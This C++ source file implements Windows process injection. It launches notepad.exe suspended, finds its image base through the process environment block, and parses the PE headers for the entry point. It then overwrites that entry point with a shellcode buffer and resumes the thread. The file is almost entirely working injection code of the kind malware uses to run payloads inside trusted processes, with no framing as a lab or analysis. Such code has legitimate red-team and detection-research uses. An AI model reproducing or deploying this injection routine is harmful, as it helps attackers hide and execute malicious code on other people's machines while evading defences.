#include "utils.h"
#include "addr_of_entry_point_injection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


void addrOfEntrypointInjection() {
	STARTUPINFOA si;
	si = {};
	PROCESS_INFORMATION pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	DWORD rLen = 0;
	CreateProcessA(0, (LPSTR)"C:\\Windows\\System32\\notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);

	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");

	NtReadVirtualMemory_t NtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtReadVirtualMemory");

	NtResumeThread_t NtResumeThread = (NtResumeThread_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtResumeThread");

	// get PEB address and pointer to image base
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &rLen);

	DWORD_PTR pebOs = (DWORD_PTR)pbi.PebBaseAddress + 0x10;

	// get process image base address
	LPVOID iBase = 0;
	NtReadVirtualMemory(pi.hProcess, (LPVOID)pebOs, &iBase, sizeof(LPVOID), NULL);

	// read target process image headers
	BYTE hBuffer[4096] = {};
	NtReadVirtualMemory(pi.hProcess, (LPVOID)iBase, hBuffer, 4096, NULL);

	// get AddressOfEntryPoint
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hBuffer;
	PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)hBuffer + dosHeader->e_lfanew);
	LPVOID cEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)iBase);

	// write shellcode to image entry point and execute it
	WriteProcessMemory(pi.hProcess, cEntry, sc, sizeof(sc), NULL);
	NtResumeThread(pi.hThread, NULL);
}